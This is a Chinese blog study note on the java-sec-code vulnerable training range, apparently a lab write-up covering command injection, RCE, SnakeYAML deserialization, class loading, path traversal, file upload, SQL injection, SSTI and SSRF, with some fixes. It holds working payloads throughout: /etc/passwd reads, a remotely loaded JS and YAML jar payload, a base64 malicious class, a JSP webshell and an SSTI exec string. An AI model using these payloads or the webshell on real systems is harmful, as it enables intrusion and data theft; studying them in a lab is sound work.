---
title: java-sec-code靶场学习
date: 2025-07-19 19:19:51
tags:
- Java
category:
- 学习笔记
---

# java-sec-code靶场学习

## Cmdinject

### /codeinject

这里源码会将传入的filepath参数直接与原命令拼接，从而导致命令拼接漏洞

**payload：**

```
?filepath=/tmp;cat /etc/passwd
```

源码：

```
    @GetMapping("/codeinject")
    public String codeInject(String filepath) throws IOException {

        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

这里先将预设好的命令参数存入字符串数组cmdlist中，并且拼接上filepath

然后实例化了一个 ProcessBuilder类的对象builder，并调用了构造方法将cmdlist传入

```
 ProcessBuilder builder = new ProcessBuilder(cmdList);
```

来看下 ProcessBuilder类的构造方法。

```
    public ProcessBuilder(String... command) {
        this.command = new ArrayList<>(command.length);
        for (String arg : command)
            this.command.add(arg);
    }
```

这里主要就是将传入的命令用字符串集合存储起来赋值给成员变量this.command

然后就执行了ProcessBuilder类的redirectErrorStream方法。

```
builder.redirectErrorStream(true);
```

```
   public ProcessBuilder redirectErrorStream(boolean redirectErrorStream) {
        this.redirectErrorStream = redirectErrorStream;
        return this;
    }
```

这个方法主要就是将builder对象内的成员变量redirectErrorStream的值换成传入的参数。

#### start方法

然后就是执行builder对象的start方法。

1、把命令参数转换成字符串数组

```
String[] cmdarray = command.toArray(new String[command.size()]);
cmdarray = cmdarray.clone();
```

这里将传入的命令（字符串集合）转换成了数组形式，并且进行了克隆，是为了防止外部引用被修改。

---

2、检查参数

```
      for (String arg : cmdarray)
            if (arg == null)
                throw new NullPointerException();
```

检查命令数组中是否存在null，存在的话抛出异常。

---

3、获取执行的程序名

```
String prog = cmdarray[0];
```

获取数组的第一个元素作为要执行的程序名存入prog变量。

---

4、安全管理器检查

```
 SecurityManager security = System.getSecurityManager();
        if (security != null)
            security.checkExec(prog);
```

判断如果有安全管理器，检查是否允许执行这个程序。

---

5、获取执行目录

```
String dir = directory == null ? null : directory.toString();
```

如果指定了工作目录，就转换为字符串并赋值给dir，否则赋值为null

---

6、检查命令参数中是否含有非法字符

```
        for (int i = 1; i < cmdarray.length; i++) {
            if (cmdarray[i].indexOf('\u0000') >= 0) {
                throw new IOException("invalid null character in command");
            }
        }
```

如果命令中包含空字符 \u0000 ，抛出异常。

---

7、启动进程

```
try {
         return ProcessImpl.start(cmdarray,
                                     environment,
                                     dir,
                                     redirects,
                                     redirectErrorStream);
        } catch (IOException | IllegalArgumentException e) {
```

调用ProcessImpl.start()方法启动进程，传入命令参数、环境变量、工作目录、重定向设置等。

如果启动失败会捕获异常

---

8、异常处理

```
catch (IOException | IllegalArgumentException e) {
            String exceptionInfo = ": " + e.getMessage();
            Throwable cause = e;
            if ((e instanceof IOException) && security != null) {
                try {
                    security.checkRead(prog);
                } catch (SecurityException se) {
                    exceptionInfo = "";
                    cause = se;
                }
            }
            throw new IOException(
                "Cannot run program \"" + prog + "\""
                + (dir == null ? "" : " (in directory \"" + dir + "\")")
                + exceptionInfo,
                cause);
```

如果启动失败，尝试用安全管理器判断是否有权限读取该程序文件，如果没有权限，则隐藏具体错误信息。

抛出一个新的IOException。包含更详细的错误描述。

---

然后就是

```
return WebUtils.convertStreamToString(process.getInputStream());
```

process.getInputStream () 函数返回一个 InputStream，用于读取子进程的标准输出（stdout）。返回的就是执行的结果

然后就是 WebUtils.convertStreamToString

作用是将 `InputStream` 转换为 `String`

```
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
```

`Scanner` 是 Java 提供的工具类，用于解析输入流（如文件、字符串、`InputStream`）。这里用它来读取 `InputStream`。

\\A\` 是一个 正则表达式，表示 输入的开始位置（即匹配整个输入流，而不是按行或空格分割）。作用：让`Scanner` 一次性读取整个流，而不是逐行或逐词读取。s.hasNext()\`：检查 `Scanner` 是否有下一个 token（由于分隔符是 \`\\A\`，所以要么整个流是一个 token，要么没有）。s.next()\`：读取整个流的内容。如果流为空（\`!s.hasNext()\`），返回空字符串 `""`。

---

### /codeinject/host

源码：

```
    @GetMapping("/codeinject/host")
    public String codeInjectHost(HttpServletRequest request) throws IOException {

        String host = request.getHeader("host");
        logger.info(host);
        String[] cmdList = new String[]{"sh", "-c", "curl " + host};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

源码和上一关差不多

只是将传入的参数改成了request.getHeader("host");，即http的host头

只要在hackbar或者bp上添加Host请求头，然后命令拼接即可。

**payload：**

```
Host: ;cat /etc/passwd
```

#### 漏洞修复

修复代码

```
 @GetMapping("/codeinject/sec")
    public String codeInjectSec(String filepath) throws IOException {
        String filterFilePath = SecurityUtil.cmdFilter(filepath);
        if (null == filterFilePath) {
            return "Bad boy. I got u.";
        }
        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

cmdFilter函数代码：

```
private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
   public static String cmdFilter(String input) {
        if (!FILTER_PATTERN.matcher(input).matches()) {
            return null;
        }

        return input;
    }
```

这里其实就是使用正则表达式限制参数中的字符，防止命令注入

## RCE

### /rce/runtime/exec

源码：

```
    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(cmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }
```

**`Runtime.getRuntime().exec(cmd)`**：执行传入的 `cmd` 命令（如 `ls`、`dir`、`ping` 等）。**`p.getInputStream()`**：获取命令的标准输出（`stdout`）。

**`BufferedInputStream`**对原始 `InputStream` 进行 **缓冲包装**，提高读取效率用于 **字节流（二进制数据）**，但后续会转换成字符流（文本）。

**`BufferedReader`**：逐行读取输出，并存入 `StringBuilder`。

`String tmpStr;`临时变量，用于存储 `BufferedReader` 每次读取的一行内容。

- **`p.waitFor()`**：等待命令执行完成，并返回 **退出状态码**：
  - **`0`**：成功。
  - **非 `0`**（如 `1`）：失败（例如命令不存在或执行错误）。
- 如果命令执行失败，返回 `"Command exec failed!!"`。

return sb.toString();
如果命令执行成功，返回标准输出内容

**payload：**

```
?cmd=cat /etc/passwd
```

---

### /rce/ProcessBuilder

源码：

```
@GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            String[] arrCmd = {"/bin/sh", "-c", cmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }
```

这用的是命令拼接里同一个类（ProcessBuilder），调用start方法进行命令执行，然后将执行后的输出结果存储在sb（StringBuilder）中，然后输出

payload：

```
?cmd=cat /etc/passwd
```

---

### /rce/jscmd

源码：

```
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }
```

该代码通过远程加载一个js脚本代码，然后通过ScriptEngine类解析执行，我们的js脚本代码如下：

```
var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("cat /etc/passwd");
```

但是这里的命令执行没有回显，可以用下面这个js脚本

```
var a = mainOutput(); function mainOutput() { var x=print("you succeed");}
```

也可以用下面这个来证明js里的命令被执行。

```
try {
    // 导入 Java 的 Runtime 和 Scanner 类
    var Runtime = Java.type("java.lang.Runtime");
    var Scanner = Java.type("java.util.Scanner");

    // 要执行的命令，这里用 whoami 方便查看当前用户
    var cmd = ["cat","/flag"];  // 可以通过这样的方式 cat /flag// 不能直接在一个字符串中，得隔开

    // 执行命令
    var proc = Runtime.getRuntime().exec(cmd);

    // 等待命令执行完成
    proc.waitFor();

    // 读取命令的标准输出流
    var s = new Scanner(proc.getInputStream()).useDelimiter("\\A");
    var output = s.hasNext() ? s.next() : "no output";

    // 打印结果到服务器控制台（Nashorn 的 print）
    print("Command output: " + output);

} catch (e) {
    // 出现异常时打印错误信息
    print("Error executing command: " + e);
}
```

payload：

```
?jurl=http://xxx.xx.xxx.xx/test.js
```

成功执行

![](../image/jsc-1.png)

---

### /rce/vuln/yarm

源码：

```
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }
```

该代码利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的yaml文件如下：

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1:83/yaml-payload.jar"]
  ]]
]
```

jar是我们远程加载的恶意文件，其源码如下：

```
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("whoami");
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

因为是使用了ScriptEngineFactory接口，该接口中存在抽象方法所以要对一些抽象方法进行重构。使用下面命令打包生成jar文件

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

然后在java-sec-code目录下开启web服务

```
python -m http.server 83
```

注意：

这里的web服务端口如果有被占用的就会导致没反应，多试几个端口号

然后payload：

```
?content=!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1:83/yaml-payload.jar"]
  ]]
]
```

成功弹出计算器。

![](../image/jsc-2.png)

#### 漏洞修复：

```
Yaml y = new Yaml(new SafeConstructor());
```

通过 `new Yaml(new SafeConstructor())` 限制反序列化行为：

1. **禁用危险标签**
   `SafeConstructor` 移除了对以下功能的支持：
   - 禁止解析 `!!java`、`!!javax` 等 Java 类标签。
   - 禁止动态类加载和实例化。
2. **仅允许基本数据类型**
   默认只支持反序列化以下安全类型：
   - 基本类型（字符串、数字、布尔值）
   - 集合类型（List、Map）
   - 不能直接映射到任意 Java 类。
3. **防止 OGNL/SpEL 注入**
   避免 YAML 中的表达式被解析执行（如 Spring 的 SpEL 注入）。

---

### /rce/groovy

源码：

```
    @GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }
```

利用groovy进行命令执行

**GroovyShell**

Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。

`GroovyShell` 是 **Groovy 语言** 提供的核心类，用于 **动态解析和执行 Groovy 脚本**。可以像解释器一样直接运行 Groovy 代码，常用于脚本引擎、规则引擎或动态逻辑执行场景。

漏洞利用如下：

```
?content="calc.exe".execute()
或者
content=Runtime.getRuntime().exec('calc.exe')
```

---

## ClassDataLoader

ClassLoader就是将Java类文件（*.class）加载到 jvm（Java虚拟机） 里面，jvm通过执行class文件的字节码来执行Java程序。

Java源代码（*.java）被 javac 编译器编译后以字节码的形式保存在 class文件中然后再由 jvm 执行

加载恶意类是将恶意类加载到JVM中，当这个类被初始化时，就会执行类内的静态代码块，造成代码执行。

**漏洞代码：**

```java
package org.joychou.controller;

// 日志记录依赖
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
// Spring MVC 注解
import org.springframework.web.bind.annotation.RequestMapping;
// Spring 请求上下文工具
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
// Servlet API
import javax.servlet.http.HttpServletRequest;

public class ClassDataLoader {

    // 日志记录器
    protected final Logger logger = LoggerFactory.getLogger(this.getClass());

    // 定义HTTP接口路径为/classloader，支持GET/POST等请求方法
    @RequestMapping("/classloader")
    public void classData() {
        try{
            // 获取当前HTTP请求对象（通过Spring上下文）
            ServletRequestAttributes sra = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
            HttpServletRequest request = sra.getRequest();

            // 从请求参数中获取classData的值（需Base64编码的字节码）
            String classData = request.getParameter("classData");

            // 将Base64字符串解码为字节数组（获取原始.class文件内容）
            byte[] classBytes = java.util.Base64.getDecoder().decode(classData);

            // 通过反射获取ClassLoader的defineClass方法（关键危险点）
            // defineClass作用：将字节数组转换为Class对象
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", 
                String.class,     // 类名
                byte[].class,     // 字节码
                int.class,        // 偏移量
                int.class         // 长度
            );
            
            // 暴力反射：设置方法可访问（绕过private/protected限制）
            defineClassMethod.setAccessible(true);

            // 调用defineClass加载恶意字节码
            // 参数说明：
            // ClassLoader.getSystemClassLoader() - 使用系统类加载器
            // null - 不指定类名
            // classBytes - 恶意字节码
            // 0 - 从数组第0位开始读取
            // classBytes.length - 读取全部长度
            Class cc = (Class) defineClassMethod.invoke(
                ClassLoader.getSystemClassLoader(), 
                null, 
                classBytes, 
                0, 
                classBytes.length
            );

            // 实例化刚加载的类（触发其构造函数）
            cc.newInstance();

        }catch(Exception e){
            // 捕获所有异常并记录（可能泄露敏感信息）
            logger.error(e.toString());
        }
    }
}
```

**攻击利用**：
编写一个恶意java文件：

exp.java

```java
public class Evil {
    public Evil() {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {}
    }
}
```

然后编译为exp.class文件

```
javac exp.java
```

转换为Base64:

```
base64 -w 0 exp.class
//yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwAXBwAWAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAIAAkHABkMABoAGwEACGNhbGMuZXhlDAAcAB0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADZXhwAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcAAAAAAAEAAQAIAAkAAQAKAAAAVAACAAIAAAASKrcAAbgAAhIDtgAEV6cABEyxAAEABAANABAABQACAAsAAAASAAQAAAACAAQABAANAAUAEQAGAAwAAAAQAAL/ABAAAQcADQABBwAOAAABAA8AAAACABA=
```

发送请求：

```
/classloader?classData=恶意Base64字符串
```

弹出计算机

---

## 目录穿越

### /path_traversal/vul

源码：

```
@GetMapping("/path_traversal/vul")
    public String getImage(String filepath) throws IOException {
    	// 传入用户控制的filepath参数
        return getImgBase64(filepath); 
    }
    	
		private String getImgBase64(String imgFile) throws IOException {
		
		// 日志记录当前工作目录
        logger.info("Working directory: " + System.getProperty("user.dir"));
       
        // 日志记录用户输入路径
        logger.info("File path: " + imgFile);
		
		// 根据用户输入的路径创建File对象
        File f = new File(imgFile);
        
        // 检查文件是否存在
        if (f.exists() && !f.isDirectory()) {
        	
        	//  读取文件内容并Base64编码
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        } else {
            return "File doesn't exist or is not a file.";
        }
    }
```

主要就是根据用户输入创建文件对象，然后可以读取系统任意文件，返回base64编码后的文件内容

payload：

```
?filepath=../../../../../etc/passwd
```

#### 漏洞修复

```
    @GetMapping("/path_traversal/sec")
    public String getImageSec(String filepath) throws IOException {
        if (SecurityUtil.pathFilter(filepath) == null) {
            logger.info("Illegal file path: " + filepath);
            return "Bad boy. Illegal file path.";
        }
        return getImgBase64(filepath);
    }
```

主要是用SecurityUtil类的pathFilter方法过滤掉了例如".."和"/"这种有害的参数。

```
public static String pathFilter(String filepath) {
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf('%') != -1) {
            try {
                temp = URLDecoder.decode(temp, "utf-8");
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
            return null;
        }

        return filepath;
    }

```

---

## 文件上传

### /file/upload

源码：

```
PostMapping("/upload")
    public String singleFileUpload(@RequestParam("file") MultipartFile file,
                                   RedirectAttributes redirectAttributes) {
        if (file.isEmpty()) {
            // 赋值给uploadStatus.html里的动态参数message
            redirectAttributes.addFlashAttribute("message", "Please select a file to upload");
            return "redirect:/file/status";
        }

        try {
            // Get the file and save it somewhere
            byte[] bytes = file.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
            Files.write(path, bytes);

            redirectAttributes.addFlashAttribute("message",
                    "You successfully uploaded '" + UPLOADED_FOLDER + file.getOriginalFilename() + "'");

        } catch (IOException e) {
            redirectAttributes.addFlashAttribute("message", "upload failed");
            logger.error(e.toString());
        }

        return "redirect:/file/status";
    }
```

文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：

```
<% if ("pass".equals(request.getParameter("pwd"))) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); } %>
```

---

## SQL注入

### /sqli/jdbc/vuln

源码：

```
@RequestMapping("/jdbc/vuln")
    public String jdbc_sqli_vul(@RequestParam("username") String username) {

        StringBuilder result = new StringBuilder();

        try {
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println("Connect to database successfully.");

            // sqli vuln code
            Statement statement = con.createStatement();
            String sql = "select * from users where username = '" + username + "'";
            logger.info(sql);
            ResultSet rs = statement.executeQuery(sql);

            while (rs.next()) {
                String res_name = rs.getString("username");
                String res_pwd = rs.getString("password");
                String info = String.format("%s: %s\n", res_name, res_pwd);
                result.append(info);
                logger.info(info);
            }
            rs.close();
            con.close();


        } catch (ClassNotFoundException e) {
            logger.error("Sorry, can't find the Driver!");
        } catch (SQLException e) {
            logger.error(e.toString());
        }
        return result.toString();
    }
```

漏洞成因代码：

```
Statement statement = con.createStatement();
String sql = "select * from users where username = '" + username + "'";
logger.info(sql);
ResultSet rs = statement.executeQuery(sql);
```

GET接收到的参数直接与SQL语句进行拼接，然后被执行，可以通过闭合引号实现绕过

payload：

```
-1' union select 1,database(),3 --+
或者
-1' union select 1,database(),3'
```

---

### /jdbc/ps/vuln

源码：

```
 @RequestMapping("/jdbc/ps/vuln")
    public String jdbc_ps_vuln(@RequestParam("username") String username) {

        StringBuilder result = new StringBuilder();
        try {
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println("Connecting to Database successfully.");

            String sql = "select * from users where username = '" + username + "'";
            PreparedStatement st = con.prepareStatement(sql);

            logger.info(st.toString());
            ResultSet rs = st.executeQuery();

            while (rs.next()) {
                String res_name = rs.getString("username");
                String res_pwd = rs.getString("password");
                String info = String.format("%s: %s\n", res_name, res_pwd);
                result.append(info);
                logger.info(info);
            }

            rs.close();
            con.close();

        } catch (ClassNotFoundException e) {
            logger.error("Sorry, can't find the Driver!");
            e.printStackTrace();
        } catch (SQLException e) {
            logger.error(e.toString());
        }
        return result.toString();
    }
```

漏洞成因代码：

```
String sql = "select * from users where username = '" + username + "'";
PreparedStatement st = con.prepareStatement(sql);

logger.info(st.toString());
ResultSet rs = st.executeQuery();
```

这里虽然使用了prepareStatement进行预编译处理，可是sql语句在进入prepareStatement之前就已经和GET接收的参数进行拼接，因此仍不起到防护作用。

payload：

```
-1' union select 1,database(),3 --+
或者
-1' union select 1,database(),3'
```

---

#### 漏洞修复

```
String sql = "select * from users where username = ?";
PreparedStatement st = con.prepareStatement(sql);
st.setString(1, username);
```

使用预编译语句和参数化查询。在调用 `prepareStatement()` 时，数据库会将 `select * from users where username = ?` 编译为一个**固定的执行计划**，此时 `?` 是一个占位符，**不依赖用户输入**。

后续即使用户输入恶意字符串（如 `admin' --`），也无法修改已编译的SQL逻辑。

用户输入的 `username` 会被视为纯字符串数据，而非SQL代码的一部分。

---

### /sqli/mybatis/vuln01

源码：

```
    @GetMapping("/mybatis/vuln01")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln01(username);
    }
```

漏洞代码：

```
   public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln01(username);
    }
```

findByUserNamevuln01()函数定义

```
@Select("select * from users where username = '${username}'")
List<User> findByUserNameVuln01(@Param("username") String username);
```

该代码使用 MyBatis框架，用来指定 SQL 查询语句。**`${username}`**：在这里，`username` 是直接拼接到 SQL 查询中的。这意味着输入的内容会直接插入到 SQL 语句中，而不会进行任何预处理或转义。因此我们仍然可以用上面的方法进行SQL注入。

---

### /sqli/mybatis/vuln02

源码：

```
@GetMapping("/mybatis/vuln02")
public List<User> mybatisVuln02(@RequestParam("username") String username) 
{
    return userMapper.findByUserNameVuln02(username);
}
```

漏洞代码：

```
@GetMapping("/mybatis/vuln02")
public List<User> mybatisVuln02(@RequestParam("username") String username) 
{
   return userMapper.findByUserNameVuln02(username);
}
```

findByUserNameVuln02函数代码

```
List<User> findByUserNameVuln02(String username);
```

去掉了注解命名，但是不影响漏洞存在，仍可以用原payload

---

#### 漏洞修复

```
@Select("select * from users where username = #{username}")
```

预编译参数化查询

---

### /mybatis/orderby/vuln03

漏洞代码：

```
@GetMapping("/mybatis/orderby/vuln03")
public List<User> mybatisVuln03(@RequestParam("sort") String sort) {
   return userMapper.findByUserNameVuln03(sort);
}
```

查看findByUserNameVuln03函数的定义

```
List<User> findByUserNameVuln03(@Param("order") String order);
```

使用MyBatis框架中的order字段，换用下面方法进行注入：

payload：

```
?sort=id desc--+
```

### sql注入修复与防护

#### （1）预编译

```
String sql = "select * from users where username = ?";
PreparedStatement st = con.prepareStatement(sql);
复制代码12
```

#### （2）waf

```
 private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
 public static String sqlFilter(String sql) {
        if (!FILTER_PATTERN.matcher(sql).matches()) {
            return null;
        }
        return sql;
    
java复制代码123456
```

#### （3）MyBatis防护

```
@Select("select * from users where username = #{username}")
```

---

## SSTI

### /ssti/velocity

漏洞代码：

```
    @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
}
```

Apache  Velocity是一个基于模板的引擎，用于生成文本输出(例如：HTML、XML或任何其他形式的ASCII文本)，它的设计目标是提供一种简单且灵活的方式来将模板和上下文数据结合在一起，因此被广泛应用于各种Java应用程序中包括Web应用。具体Apache Velocity引擎的应用可以看[这篇博客](https://zhuanlan.zhihu.com/p/716756926)。

**Velocity.evaluate**

Velocity.evaluate是Velocity引擎中的一个方法，用于处理字符串模板的评估，Velocity是一个基于Java的模板引擎，广泛应用于WEB开发和其他需要动态内容生成的场合，Velocity.evaluate方法的主要作用是将给定的模板字符串与上下文对象结合并生成最终的输出结果，这个方法通常用于在运行时动态创建内容，比如：生成HTML页面的内容或电子邮件的文本，方法如下所示：

```
public static void evaluate(Context context, Writer writer, String templateName, String template)
```

参数说明：

Context context：提供模板所需的数据上下文，可以包含多个键值对
Writer writer：输出流，用于写入生成的内容
String templateName：模板的名称，通常用于调试信息中
String template：要评估的模板字符串

可以构造以下代码：

```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc.exe")
```

payload：

```
?template=%23set(%24e%3D%22e%22)%3B%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22calc.exe%22)
```

注意这里要url编码才能生效

---

## SSRF

### /ssrf/urlConnection/vuln

源码：

```
    @RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
    public String URLConnectionVuln(String url) {
        return HttpUtils.URLConnection(url);
    }
```

然后再看看URLConnection函数的定义

```
    public static String URLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (Exception e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
```

这里我们可以用文件读取协议 file:/ 实现访问，也可以访问到内网的其他主机

payload：

```
?url=file:///D://root/flag.txt
```

---

### /ssrf/HttpURLConnection/vuln

源码：

```
    @GetMapping("/HttpURLConnection/vuln")
    public String httpURLConnectionVuln(@RequestParam String url) {
        return HttpUtils.HttpURLConnection(url);
    }
```

HttpUrlConnection函数定义

```
    public static String HttpURLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (IOException e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
```

这里用`HttpURLConnection`类进行了一个强转，限制只能使用http/https协议，但可以访问内网其他主机：

payload：

```
?url=http://127.0.0.1:8080
```

---

### /ssrf/openStream

源码：

```
 @GetMapping("/openStream")
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try {
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);
            // download
            response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) > 0) {
                outputStream.write(bytes, 0, length);
            }

        } catch (Exception e) {
            logger.error(e.toString());
        } finally {
            if (inputStream != null) {
                inputStream.close();
            }
            if (outputStream != null) {
                outputStream.close();
            }
        }
    }
```

可以通过这个路由实现任意文件下载：

payload：

```
?url=file:///D:/root/flag.txt
```

---

### /ssrf/HttpSyncClients/vuln

源码：

```
    @GetMapping("/HttpSyncClients/vuln")
    public String HttpSyncClients(@RequestParam("url") String url) {
        return HttpUtils.HttpAsyncClients(url);
    }
```

查看HttpAsyncClients函数

```
    public static String HttpAsyncClients(String url) {
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try {
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future<HttpResponse> future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        } catch (Exception e) {
            return e.getMessage();
        } finally {
            try {
                httpclient.close();
            } catch (Exception e) {
                logger.error(e.getMessage());
            }
        }
    }
}

```

未对 SSRF 进行检查，存在漏洞：

payload：

```
http://127.0.0.1:8080
```

---

### /ssrf/restTemplate/vuln1

源码：

```
    @GetMapping("/restTemplate/vuln1")
    public String RestTemplateUrlBanRedirects(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        // 发起http请求，并禁止重定向
        return httpService.RequestHttpBanRedirects(url, headers);
    }

```

